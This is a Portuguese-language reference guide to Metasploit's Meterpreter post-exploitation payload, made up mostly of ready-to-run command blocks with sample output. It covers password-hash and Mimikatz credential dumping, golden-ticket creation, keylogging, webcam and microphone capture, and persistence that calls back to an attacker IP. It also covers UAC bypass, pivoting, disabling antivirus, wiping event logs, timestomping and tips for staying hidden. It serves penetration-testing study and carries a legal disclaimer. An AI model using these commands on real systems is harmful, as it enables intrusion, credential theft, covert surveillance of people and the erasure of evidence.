# 🎭 Meterpreter — guia de referência completo

<!-- language-home-navigation -->
[🏠 Página inicial em português](../../README.pt.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](Meterpreter.tr.md) • [🇬🇷 Ελληνικά](Meterpreter.el.md)

```
    ███╗   ███╗███████╗████████╗███████╗██████╗ ██████╗ ██████╗ ███████╗████████╗███████╗██████╗ 
    ████╗ ████║██╔════╝╚══██╔══╝██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔════╝╚══██╔══╝██╔════╝██╔══██╗
    ██╔████╔██║█████╗     ██║   █████╗  ██████╔╝██████╔╝██████╔╝█████╗     ██║   █████╗  ██████╔╝
    ██║╚██╔╝██║██╔══╝     ██║   ██╔══╝  ██╔══██╗██╔═══╝ ██╔══██╗██╔══╝     ██║   ██╔══╝  ██╔══██╗
    ██║ ╚═╝ ██║███████╗   ██║   ███████╗██║  ██║██║     ██║  ██║███████╗   ██║   ███████╗██║  ██║
    ╚═╝     ╚═╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
```

![Meterpreter](https://img.shields.io/badge/Meterpreter-Session-purple?style=for-the-badge)
![Pós-exploração](https://img.shields.io/badge/Post-Exploitation-orange?style=for-the-badge)
![Metasploit](https://img.shields.io/badge/Metasploit-Framework-blue?style=for-the-badge)
![Windows](https://img.shields.io/badge/Windows-Linux-green?style=for-the-badge)

> **A ferramenta de pós-exploração por excelência** - O teu conjunto completo de ferramentas após obter acesso

> **Termos usados:** pentest significa teste de intrusão; exploit é código que explora uma vulnerabilidade; payload é a carga executada; listener é um processo à escuta. Pós-exploração refere-se às ações após o acesso inicial. Mantêm-se os nomes técnicos e os literais dos exemplos; a disponibilidade de módulos e opções depende da versão e da plataforma.

> **Notas de versão:** as implementações e transportes de Meterpreter variam; a descrição de DLLs, stager e TLS não é universal a todos os payloads, nem a execução em memória implica ausência de vestígios. Os scripts antigos chamados por `run persistence`, `metsvc` ou `autoroute` são exemplos legados; a API oficial identifica os [scripts Meterpreter como obsoletos e mapeia substituições](https://docs.metasploit.com/api/Msf/Sessions/Scriptable.html). `getsystem` tenta elevar privilégios, não é apenas uma verificação. `exit`/`quit` terminam a sessão; `background` coloca-a em segundo plano. Migrar para LSASS não é um requisito geral de `hashdump`, e a lista de processos do original não constitui garantia de migração segura.

---

## 📋 Índice

- [O que é o Meterpreter?](#-what-is-meterpreter)
- [Comandos principais](#-core-commands)
- [Informações do sistema](#-system-information)
- [Comandos do sistema de ficheiros](#-file-system-commands)
- [Comandos de rede](#-network-commands)
- [Comandos de processos](#-process-commands)
- [Comandos de utilizadores e privilégios](#-user--privilege-commands)
- [Recolha de palavras-passe](#-password-harvesting)
- [Registo de teclas premidas](#-keylogging)
- [Capturas de ecrã e webcam](#-screenshot--webcam)
- [Persistência](#-persistence)
- [Pivoting e reencaminhamento de portas](#-pivoting--port-forwarding)
- [Técnicas contra a análise forense](#-anti-forensics)
- [Scripts e automatização](#-scripting--automation)
- [Tabela de referência rápida](#-quick-reference-table)
- [Conselhos e sugestões](#-tips--tricks)

---

<a id="-what-is-meterpreter"></a>
## 🎯 O que é o Meterpreter?

O **Meterpreter** (Meta-Interpreter) é um payload avançado, extensível de forma dinâmica, que o original descreve através da injeção de DLLs em memória e da comunicação pelo socket de um stager.

### Funcionalidades principais

| Funcionalidade | Descrição |
|---------|-------------|
| **Execução em memória** | Executa integralmente em RAM, deixando poucos vestígios |
| **Comunicação cifrada** | Canal cifrado por TLS até ao servidor C2 |
| **Extensível** | Carregar extensões durante a execução |
| **Multiplataforma** | Windows, Linux, macOS, Android, PHP, Java |
| **Suporta pivoting** | Encaminhar tráfego através de sistemas comprometidos |

### Tipos de Meterpreter

```bash
# Windows
windows/meterpreter/reverse_tcp
windows/x64/meterpreter/reverse_tcp
windows/meterpreter/reverse_https

# Linux
linux/x86/meterpreter/reverse_tcp
linux/x64/meterpreter/reverse_tcp

# macOS
osx/x64/meterpreter/reverse_tcp

# Android
android/meterpreter/reverse_tcp

# PHP
php/meterpreter/reverse_tcp

# Java
java/meterpreter/reverse_tcp

# Python
python/meterpreter/reverse_tcp
```

---

<a id="-core-commands"></a>
## ⌨️ Comandos principais

### Ajuda e navegação

```bash
# Apresentar todos os comandos
meterpreter > help

# Obter ajuda para um comando específico
meterpreter > help upload

# Mostrar informações dos canais
meterpreter > channel -l
```

### Gestão de sessões

```bash
# Obter informações da sessão
meterpreter > info

# Colocar a sessão atual em segundo plano
meterpreter > background
meterpreter > bg

# Voltar ao msfconsole
meterpreter > exit

# Terminar a sessão completamente
meterpreter > quit

# Voltar a ligar se a ligação cair
meterpreter > transport list
meterpreter > transport add -t reverse_tcp -l <LHOST> -p <LPORT>
```

### Operações com canais

```bash
# Listar canais ativos
meterpreter > channel -l

# Interagir com um canal
meterpreter > channel -i <id>

# Ler de um canal
meterpreter > channel -r <id>

# Escrever num canal
meterpreter > channel -w <id>

# Fechar um canal
meterpreter > channel -c <id>
```

---

<a id="-system-information"></a>
## 💻 Informações do sistema

### Informações básicas do sistema

```bash
# Obter informações do sistema
meterpreter > sysinfo
Computer        : WIN-PC
OS              : Windows 10 (10.0 Build 19041)
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows

# Obter o utilizador atual
meterpreter > getuid
Server username: WIN-PC\Administrator

# Obter o ID do processo atual
meterpreter > getpid
Current pid: 1234

# Obter o nome do processo
meterpreter > getpname

# Verificar se está numa máquina virtual
meterpreter > run post/windows/gather/checkvm
```

### Ambiente e registo

```bash
# Listar variáveis de ambiente
meterpreter > getenv PATH
meterpreter > getenv USERNAME

# Definir uma variável de ambiente
meterpreter > setenv VAR value

# Operações no registo (Windows)
meterpreter > reg enumkey -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
meterpreter > reg queryval -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v SecurityHealth
meterpreter > reg setval -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v Backdoor -d "C:\\backdoor.exe"
meterpreter > reg deleteval -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v Backdoor
```

### Software e correções instalados

```bash
# Listar aplicações instaladas
meterpreter > run post/windows/gather/enum_applications

# Listar correções/atualizações instaladas
meterpreter > run post/windows/gather/enum_patches

# Procurar caminhos de serviços sem aspas
meterpreter > run post/windows/gather/enum_unquoted_service_paths
```

---

<a id="-file-system-commands"></a>
## 📁 Comandos do sistema de ficheiros

### Navegação

```bash
# Mostrar a pasta de trabalho
meterpreter > pwd
C:\Users\Administrator\Desktop

# Listar o conteúdo da pasta
meterpreter > ls
meterpreter > ls -la

# Mudar de pasta
meterpreter > cd C:\\Users
meterpreter > cd ..

# Mostrar a pasta local atual
meterpreter > lpwd

# Mudar a pasta local
meterpreter > lcd /tmp

# Listar a pasta local
meterpreter > lls
```

### Operações com ficheiros

```bash
# Ler o conteúdo do ficheiro
meterpreter > cat C:\\Users\\Administrator\\Desktop\\secret.txt

# Editar ficheiro
meterpreter > edit C:\\file.txt

# Eliminar ficheiro
meterpreter > rm C:\\temp\\malware.exe

# Criar pasta
meterpreter > mkdir C:\\temp\\hidden

# Eliminar a pasta
meterpreter > rmdir C:\\temp\\hidden

# Copiar o ficheiro
meterpreter > cp source.txt destination.txt

# Mover/mudar o nome do ficheiro
meterpreter > mv oldname.txt newname.txt
```

### Transferência de ficheiros

```bash
# Descarregar um ficheiro do alvo
meterpreter > download C:\\Users\\Administrator\\Desktop\\passwords.txt
meterpreter > download C:\\Users\\Administrator\\Desktop\\passwords.txt /tmp/

# Descarregar recursivamente
meterpreter > download -r C:\\Users\\Administrator\\Documents

# Enviar um ficheiro para o alvo
meterpreter > upload /tmp/backdoor.exe C:\\Windows\\Temp\\
meterpreter > upload -r /local/directory C:\\remote\\directory

# Mostrar o progresso de descarga/envio
meterpreter > download -p C:\\large_file.zip
```

### Pesquisa de ficheiros

```bash
# Procurar ficheiros
meterpreter > search -f *.txt
meterpreter > search -f password* -d C:\\Users
meterpreter > search -f *.docx -d C:\\

# Procurar uma extensão específica em todas as unidades
meterpreter > search -f *.kdbx

# Procurar padrões específicos de nomes de ficheiros
meterpreter > search -f *password* -r
```

### Hashes e marcas temporais de ficheiros

```bash
# Obter a soma de controlo do ficheiro
meterpreter > checksum md5 C:\\Windows\\System32\\cmd.exe
meterpreter > checksum sha1 C:\\Windows\\System32\\cmd.exe
meterpreter > checksum sha256 C:\\file.exe

# Modificar marcas temporais (timestomp)
meterpreter > timestomp C:\\backdoor.exe -f C:\\Windows\\System32\\cmd.exe
meterpreter > timestomp C:\\backdoor.exe -z "01/01/2020 00:00:00"
meterpreter > timestomp C:\\backdoor.exe -m "01/01/2020 00:00:00"
meterpreter > timestomp C:\\backdoor.exe -a "01/01/2020 00:00:00"
meterpreter > timestomp C:\\backdoor.exe -c "01/01/2020 00:00:00"
```

---

<a id="-network-commands"></a>
## 🌐 Comandos de rede

### Informações de rede

```bash
# Obter as interfaces de rede
meterpreter > ipconfig
meterpreter > ifconfig

# Obter a tabela de encaminhamento
meterpreter > route

# Obter a cache ARP
meterpreter > arp

# Obter as ligações de rede ativas
meterpreter > netstat
```

### Reencaminhamento de portas

```bash
# Reencaminhar uma porta local para o sistema remoto
meterpreter > portfwd add -l 8080 -p 80 -r 192.168.1.100

# Listar reencaminhamentos de portas
meterpreter > portfwd list

# Eliminar o reencaminhamento de porta
meterpreter > portfwd delete -l 8080 -p 80 -r 192.168.1.100

# Remover todos os reencaminhamentos de portas
meterpreter > portfwd flush

# Exemplo: reencaminhar RDP
meterpreter > portfwd add -l 3389 -p 3389 -r 10.10.10.5
# Ligar agora: rdesktop 127.0.0.1:3389
```

### DNS e utilitários de rede

```bash
# Resolver o nome do sistema
meterpreter > resolve google.com

# Obter as definições do proxy
meterpreter > run post/windows/gather/enum_proxy
```

---

<a id="-process-commands"></a>
## ⚙️ Comandos de processos

### Listagem de processos

```bash
# Listar todos os processos
meterpreter > ps

# Filtrar processos
meterpreter > pgrep explorer.exe
meterpreter > pgrep -u Administrator

# Obter informações do processo atual
meterpreter > getpid
```

### Manipulação de processos

```bash
# Migrar para outro processo
meterpreter > migrate <PID>
meterpreter > migrate -N explorer.exe

# Terminar um processo
meterpreter > kill <PID>

# Executar um comando e obter a saída
meterpreter > execute -f cmd.exe -a "/c whoami" -i -H

# Executar em segundo plano
meterpreter > execute -f notepad.exe -H

# Executar com entrada/saída através de canais
meterpreter > execute -f cmd.exe -c -i
```

### Conselhos para migração de processos

```bash
# Alvos de migração considerados estáveis no original (Windows)
# - explorer.exe (contexto do utilizador, estável)
# - svchost.exe (SYSTEM, várias instâncias)
# - lsass.exe (SYSTEM, indicado no original para hashdump)

# Procurar explorer.exe e migrar
meterpreter > ps | grep explorer
meterpreter > migrate <explorer_pid>

# Migrar automaticamente para um processo estável
meterpreter > run post/windows/manage/migrate
```

---

<a id="-user--privilege-commands"></a>
## 👤 Comandos de utilizadores e privilégios

### Informações do utilizador atual

```bash
# Obter o utilizador atual
meterpreter > getuid
Server username: WIN-PC\Administrator

# Obter os privilégios atuais
meterpreter > getprivs

# Verificar a elevação de privilégios (Windows)
meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation)
```

### Escalada de privilégios

```bash
# Tentar obter privilégios SYSTEM
meterpreter > getsystem
meterpreter > getsystem -t 1  # Personificação através de named pipe (em memória/administrador)
meterpreter > getsystem -t 2  # Personificação através de named pipe (dropper/administrador)
meterpreter > getsystem -t 3  # Duplicação de token (em memória/administrador)

# Contornar o UAC (a partir de msfconsole)
msf6 > use exploit/windows/local/bypassuac_eventvwr
msf6 > set SESSION 1
msf6 > exploit

# Sugestão de exploits locais
meterpreter > run post/multi/recon/local_exploit_suggester

# Roubar o token de outro processo
meterpreter > steal_token <PID>

# Descartar o token roubado
meterpreter > drop_token

# Personificar um utilizador
meterpreter > impersonate_token "DOMAIN\\Administrator"

# Listar tokens disponíveis
meterpreter > use incognito
meterpreter > list_tokens -u
```

### Enumeração de utilizadores

```bash
# Listar utilizadores locais
meterpreter > run post/windows/gather/enum_logged_on_users

# Listar utilizadores do domínio (se o sistema pertencer a um domínio)
meterpreter > run post/windows/gather/enum_domain_users

# Listar grupos locais
meterpreter > run post/windows/gather/local_admin_search_enum
```

---

<a id="-password-harvesting"></a>
## 🔐 Recolha de palavras-passe

### Extração de hashes

```bash
# Extrair hashes de palavras-passe (requer SYSTEM)
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
user:1001:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::

# Se hashdump falhar, experimentar
meterpreter > run post/windows/gather/smart_hashdump
```

### Extensão Mimikatz / Kiwi

```bash
# Carregar Kiwi (Mimikatz)
meterpreter > load kiwi

# Obter todas as credenciais
meterpreter > creds_all

# Obter a palavra-passe da memória
meterpreter > kiwi_cmd sekurlsa::logonpasswords

# Extrair tickets Kerberos
meterpreter > kiwi_cmd sekurlsa::tickets

# Obter palavras-passe Wi-Fi
meterpreter > kiwi_cmd misc::wifi

# Extração LSA
meterpreter > lsa_dump_sam
meterpreter > lsa_dump_secrets

# Golden ticket
meterpreter > golden_ticket_create -d domain.local -k <krbtgt_hash> -s <domain_sid> -u Administrator -t /tmp/golden.kirbi
```

### Recolha de credenciais

```bash
# Procurar credenciais em ficheiros
meterpreter > run post/multi/gather/credentials/generic

# Credenciais dos navegadores
meterpreter > run post/multi/gather/firefox_creds
meterpreter > run post/windows/gather/enum_chrome

# Chaves SSH
meterpreter > run post/multi/gather/ssh_creds

# Gestor de Credenciais do Windows
meterpreter > run post/windows/gather/enum_cred_store

# Credenciais do Outlook
meterpreter > run post/windows/gather/credentials/outlook
```

---

<a id="-keylogging"></a>
## ⌨️ Registo de teclas premidas

### Iniciar/parar o registo de teclas

```bash
# Iniciar o registo de teclas
meterpreter > keyscan_start
Starting the keystroke sniffer...

# Extrair as teclas registadas
meterpreter > keyscan_dump
Dumping captured keystrokes...
username: admin
password: secretpass123

# Parar o registo de teclas
meterpreter > keyscan_stop
Stopping the keystroke sniffer...
```

### Registo avançado de teclas

```bash
# Executar o registo de teclas num processo separado
meterpreter > run post/windows/capture/keylog_recorder

# Migrar para um processo com acesso ao teclado (explorer.exe)
meterpreter > migrate -N explorer.exe
meterpreter > keyscan_start
```

---

<a id="-screenshot--webcam"></a>
## 📸 Capturas de ecrã e webcam

### Capturas de ecrã

```bash
# Capturar uma imagem do ecrã
meterpreter > screenshot
Screenshot saved to: /root/screenshot.jpeg

# Capturar o ecrã com um caminho personalizado
meterpreter > screenshot -p /tmp/screen.jpg

# Capturas contínuas do ecrã
meterpreter > run post/multi/gather/screen_spy

# Ver o ambiente de trabalho em tempo real
meterpreter > screenshare
```

### Operações com webcam

```bash
# Listar webcams
meterpreter > webcam_list
1: Integrated Webcam

# Capturar uma imagem da webcam
meterpreter > webcam_snap
[*] Starting...
[+] Got frame
[*] Stopped
Webcam shot saved to: /root/webcam.jpeg

# Capturar uma imagem com opções
meterpreter > webcam_snap -i 1 -p /tmp/webcam.jpg

# Transmitir a webcam em tempo real
meterpreter > webcam_stream
```

### Gravação de áudio

```bash
# Gravar o microfone
meterpreter > record_mic -d 30
[*] Starting...
[*] Stopped
Audio saved to: /root/audio.wav

# Gravar com uma duração personalizada
meterpreter > record_mic -d 60 -f /tmp/recording.wav
```

---

<a id="-persistence"></a>
## 🔄 Persistência

### Persistência em Windows

```bash
# Persistência no registo
meterpreter > run persistence -X -i 10 -p 4444 -r 192.168.1.50

# Persistência através de tarefa agendada
meterpreter > run post/windows/manage/persistence_exe

# Persistência através de serviço
meterpreter > run metsvc

# Persistência WMI
meterpreter > run post/windows/manage/wmi_persistence
```

### Explicação das opções de persistência

```bash
# Opções do script persistence
-A        # Iniciar automaticamente um handler compatível
-L <path> # Localização onde escrever o payload
-P <path> # Payload a utilizar
-S        # Iniciar como serviço (com SYSTEM)
-T        # Modelo EXE alternativo
-U        # Iniciar no início de sessão do utilizador
-X        # Iniciar no arranque do sistema
-i <sec>  # Intervalo entre tentativas de ligação
-p <port> # Porta à qual o payload se irá ligar
-r <ip>   # IP ao qual o payload se irá ligar
```

### Remover a persistência

```bash
# Listar mecanismos de persistência
meterpreter > run post/windows/gather/enum_persistence

# Remover a persistência (manualmente)
meterpreter > reg deleteval -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v Backdoor
```

---

<a id="-pivoting--port-forwarding"></a>
## 🔀 Pivoting e reencaminhamento de portas

### Gestão de rotas

```bash
# Adicionar uma rota através da sessão
meterpreter > run autoroute -s 10.10.10.0/24

# Ver rotas
meterpreter > run autoroute -p

# Eliminar a rota
meterpreter > run autoroute -d -s 10.10.10.0/24

# A partir de msfconsole
msf6 > route add 10.10.10.0 255.255.255.0 1
msf6 > route print
```

### Proxy SOCKS

```bash
# Iniciar o proxy SOCKS (a partir de msfconsole)
msf6 > use auxiliary/server/socks_proxy
msf6 > set SRVPORT 1080
msf6 > set VERSION 4a
msf6 > run -j

# Configurar proxychains
# Editar /etc/proxychains.conf:
# socks4 127.0.0.1 1080

# Utilizar com proxychains
proxychains nmap -sT -Pn 10.10.10.0/24
proxychains ssh user@10.10.10.5
```

### Exemplos de reencaminhamento de portas

```bash
# Reencaminhar uma porta local para um sistema interno
meterpreter > portfwd add -l 445 -p 445 -r 10.10.10.5

# Reencaminhamento de porta inverso
meterpreter > portfwd add -R -l 8080 -p 80 -L 192.168.1.50

# Cenários de exemplo:
# Aceder ao servidor Web interno
meterpreter > portfwd add -l 8080 -p 80 -r 10.10.10.100

# Aceder ao RDP interno
meterpreter > portfwd add -l 33389 -p 3389 -r 10.10.10.5

# Aceder ao SMB interno
meterpreter > portfwd add -l 1445 -p 445 -r 10.10.10.5
```

---

<a id="-anti-forensics"></a>
## 🧹 Técnicas contra a análise forense

### Limpar provas

```bash
# Limpar registos de eventos Windows
meterpreter > clearev
[*] Wiping 1234 records from Application...
[*] Wiping 5678 records from System...
[*] Wiping 9012 records from Security...

# Alterar marcas temporais de ficheiros
meterpreter > timestomp C:\\backdoor.exe -f C:\\Windows\\System32\\calc.exe
```

### Técnicas de evasão

```bash
# Migrar para um processo legítimo
meterpreter > migrate -N svchost.exe

# Verificar se existe monitorização
meterpreter > run post/windows/gather/enum_av

# Desativar o antivírus (arriscado)
meterpreter > run post/windows/manage/killav

# Ocultar o processo
meterpreter > run post/windows/manage/inject_host
```

---

<a id="-scripting--automation"></a>
## 📜 Scripts e automatização

### Scripts de recursos

```bash
# Criar um script de recursos
echo "sysinfo
getuid
hashdump
run post/windows/gather/enum_logged_on_users" > post_exploit.rc

# Executar um script de recursos
meterpreter > resource post_exploit.rc
```

### Scripts comuns

```bash
# Enumeração do sistema
meterpreter > run scraper

# Recolher toda a informação
meterpreter > run winenum

# Procurar máquinas virtuais
meterpreter > run checkvm

# Obter sub-redes locais para pivoting
meterpreter > run get_local_subnets

# Reconhecimento em várias plataformas
meterpreter > run post/multi/recon/local_exploit_suggester
```

### IRB Shell (Ruby)

```bash
# Entrar no modo IRB
meterpreter > irb

# Exemplo: listar ficheiros
>> client.fs.dir.entries("C:\\")

# Exemplo: ler um ficheiro
>> client.fs.file.open("C:\\secret.txt").read

# Sair do IRB
>> exit
```

---

<a id="-quick-reference-table"></a>
## 📊 Tabela de referência rápida

### Comandos essenciais

| Comando | Descrição |
|---------|-------------|
| `sysinfo` | Informações do sistema |
| `getuid` | Utilizador atual |
| `getpid` | ID do processo atual |
| `ps` | Listar processos |
| `migrate <PID>` | Migrar para outro processo |
| `getsystem` | Elevar para SYSTEM |
| `hashdump` | Extrair hashes de palavras-passe |
| `shell` | Abrir uma shell do sistema |
| `upload <src> <dst>` | Enviar ficheiro |
| `download <src>` | Descarregar ficheiro |
| `screenshot` | Capturar o ecrã |
| `webcam_snap` | Captura da webcam |
| `keyscan_start` | Iniciar o registo de teclas |
| `keyscan_dump` | Obter as teclas registadas |

### Operações com ficheiros

| Comando | Descrição |
|---------|-------------|
| `pwd` | Mostrar a pasta de trabalho |
| `cd <dir>` | Mudar de pasta |
| `ls` | Listar ficheiros |
| `cat <file>` | Ler ficheiro |
| `edit <file>` | Editar ficheiro |
| `rm <file>` | Eliminar ficheiro |
| `mkdir <dir>` | Criar pasta |
| `search -f <pattern>` | Procurar ficheiros |

### Operações de rede

| Comando | Descrição |
|---------|-------------|
| `ipconfig` | Interfaces de rede |
| `route` | Tabela de encaminhamento |
| `netstat` | Ligações ativas |
| `portfwd add -l <lport> -p <rport> -r <rhost>` | Reencaminhar porta |
| `run autoroute -s <subnet>` | Adicionar rota para pivoting |

### Escalada de privilégios

| Comando | Descrição |
|---------|-------------|
| `getsystem` | Obter privilégios SYSTEM |
| `getprivs` | Listar privilégios atuais |
| `steal_token <PID>` | Roubar o token de um processo |
| `load incognito` | Carregar a extensão incognito |
| `list_tokens -u` | Listar tokens disponíveis |
| `impersonate_token` | Personificar o token de um utilizador |

### Recolha de credenciais

| Comando | Descrição |
|---------|-------------|
| `hashdump` | Extrair hashes SAM |
| `load kiwi` | Carregar Mimikatz |
| `creds_all` | Todas as credenciais |
| `lsa_dump_sam` | Extração SAM através de LSA |
| `kiwi_cmd <cmd>` | Executar um comando Mimikatz |

---

<a id="-tips--tricks"></a>
## 💡 Conselhos e sugestões

### Boas práticas

1. **Migrar sempre primeiro**
   ```bash
   # Migrar para um processo estável antes de qualquer outra ação
   meterpreter > migrate -N explorer.exe
   ```

2. **Colocar sessões em segundo plano**
   ```bash
   # Colocar as sessões em segundo plano em vez de as fechar
   meterpreter > background
   ```

3. **Utilizar payloads com comunicações cifradas**
   ```bash
   # Preferir payloads HTTPS
   windows/meterpreter/reverse_https
   ```

4. **Verificar antes de agir**
   ```bash
   # Verificar sempre os privilégios
   meterpreter > getuid
   meterpreter > getprivs
   ```

### Resolução de problemas

| Problema | Solução |
|-------|----------|
| A sessão termina | Migrar para um processo estável |
| hashdump falha | Obter primeiro SYSTEM com `getsystem` |
| getsystem falha | Experimentar outra técnica `-t 1,2,3` |
| O registo de teclas está vazio | Migrar para explorer.exe |
| Os comandos excedem o tempo limite | Verificar a ligação à rede |

### Conselhos para reduzir a visibilidade

```bash
# 1. Migrar do processo inicial
meterpreter > migrate -N svchost.exe

# 2. Limpar vestígios
meterpreter > clearev

# 3. Utilizar timestomp nos ficheiros enviados
meterpreter > timestomp C:\\file.exe -f C:\\Windows\\System32\\calc.exe

# 4. Eliminar os ficheiros criados no final
meterpreter > rm C:\\temp\\payload.exe
```

---

## ⚠️ Aviso legal

> **AVISO:** Este guia destina-se apenas a fins educativos e a testes de intrusão autorizados. O acesso não autorizado a sistemas informáticos é ilegal. Obtém sempre a autorização adequada antes de testar.

---

## 📚 Recursos relacionados

- [Guia do Metasploit Framework](./README.pt.md)
- [Offensive Security Documentation](https://www.offensive-security.com/)
- [Rapid7 Metasploit Documentation](https://docs.metasploit.com/)

---

<p align="center">
  <b>🎭 Domina a pós-exploração!</b><br>
  <i>Com o Meterpreter, a exploração continua após o acesso inicial</i>
</p>
